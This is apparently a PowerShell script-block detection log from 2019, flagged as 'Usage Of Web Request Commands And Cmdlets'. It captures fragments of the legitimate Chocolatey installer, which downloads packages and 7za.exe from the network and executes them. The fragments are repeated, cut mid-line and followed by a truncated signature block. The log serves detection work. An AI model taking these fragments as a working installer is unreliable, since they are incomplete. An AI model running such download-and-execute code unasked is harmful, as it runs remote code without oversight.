https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: ¦ ScriptBlockId: e992c6bd-f3bf-42a3-80ea-9e74d03e44fe ¦ ScriptBlockText: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","eddbf1d6-60c9-96f5-4cdf-f0947b3aad8f"
"2019-03-19 14:21:31.332 +01:00","Usage Of Web Request Commands And Cmdlets - ScriptBlock","med","MSEDGEWIN10","PwSh",4104,55,"ScriptBlock: ning ""Tab completion does not currently work in PowerShell v2. `n Please upgrade to a more recent version of PowerShell to take advantage of tab completion."" #Write-ChocolateyWarning ""To load tab expansion, you need to install PowerTab. `n See https://powertab.codeplex.com/ for details."" } } catch { Write-ChocolateyWarning ""Unable to add Chocolatey to the profile. You will need to do it manually. Error was '$_'"" @' This is how add the Chocolatey Profile manually. Find your $profile. Then add the following lines to it: $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ | Write-Output } } $netFx4InstallTries = 0 function Install-DotNet4IfMissing { param( $forceFxInstall = $false ) # we can't take advantage of any chocolatey module functions, because they # haven't been unpacked because they require .NET Framework 4.0 Write-Debug ""Install-DotNet4IfMissing called with `$forceFxInstall=$forceFxInstall"" $NetFxArch = ""Framework"" if ([IntPtr]::Size -eq 8) {$NetFxArch=""Framework64"" } $NetFx4ClientUrl = 'https://download.microsoft.com/download/5/6/2/562A10F9-C9F4-4313-A044-9C94E0A8FAC8/dotNetFx40_Client_x86_x64.exe' $NetFx4FullUrl = 'https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe' $NetFx4Url = $NetFx4FullUrl $NetFx4Path = ""$tempDir"" $NetFx4InstallerFile = 'dotNetFx40_Full_x86_x64.exe' $NetFx4Installer = Join-Path $NetFx4Path $NetFx4InstallerFile if ((!(Test-Path ""$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319"") -and !(Test-Path ""C:\Windows\Microsoft.Net\$NetFxArch\v4.0.30319"")) -or $forceFxInstall) { Write-Output ""'$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319' was not found or this is forced"" if (!(Test-Path $NetFx4Path)) { Write-Output ""Creating folder `'$NetFx4Path`'"" $null = New-Item -Path ""$NetFx4Path"" -ItemType Directory } $netFx4InstallTries += 1 if (!(Test-Path $NetFx4Installer)) { Write-Output ""Downloading `'$NetFx4Url`' to `'$NetFx4Installer`' - the installer is 40+ MBs, so this could take a while on a slow connection."" (New-Object Net.WebClient).DownloadFile(""$NetFx4Url"",""$NetFx4Installer"") } $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.WorkingDirectory = ""$NetFx4Path"" $psi.FileName = ""$NetFx4InstallerFile"" # https://msdn.microsoft.com/library/ee942965(v=VS.100).aspx#command_line_options # http://blogs.msdn.com/b/astebner/archive/2010/05/12/10011664.aspx # For the actual setup.exe (if you want to unpack first) - /repair /x86 /x64 /ia64 /parameterfolder Client /q /norestart $psi.Arguments = ""/q /norestart /repair"" Write-Output ""Installing `'$NetFx4Installer`' - this may take awhile with no output."" $s = [System.Diagnostics.Process]::Start($psi); $s.WaitForExit(); if ($s.ExitCode -ne 0 -and $s.ExitCode -ne 3010) { if ($netFx4InstallTries -ge 2) { Write-ChocolateyError "".NET Framework install failed with exit code `'$($s.ExitCode)`'. `n This will cause the rest of the install to fail."" throw ""Error installing .NET Framework 4.0 (exit code $($s.ExitCode)). `n Please install the .NET Framework 4.0 manually and then try to install Chocolatey again. `n Download at `'$NetFx4Url`'"" } else { Write-ChocolateyWarning ""Try #$netFx4InstallTries of .NET framework install failed with exit code `'$($s.ExitCode)`'. Trying again."" Install-DotNet4IfMissing $true } } } } function Invoke-Chocolatey-Initial { Write-Debug ""Initializing Chocolatey files, etc by running Chocolatey..."" try { $chocoInstallationFolder = Get-ChocolateyInstallFolder $chocoExe = Join-Path -Path $chocoInstallationFolder -ChildPath ""choco.exe"" & $chocoExe -v | Out-Null Write-Debug ""Chocolatey execution completed successfully."" } catch { Write-ChocolateyWarning ""Unable to run Chocolately at this time. It is likely that .Net Framework installation requires a system reboot"" } } Export-ModuleMember -function Initialize-Chocolatey; # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAkEkEipuZa+5py # 29A1WQhQQVpJYzMWl/kN8goJPe7XT6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # 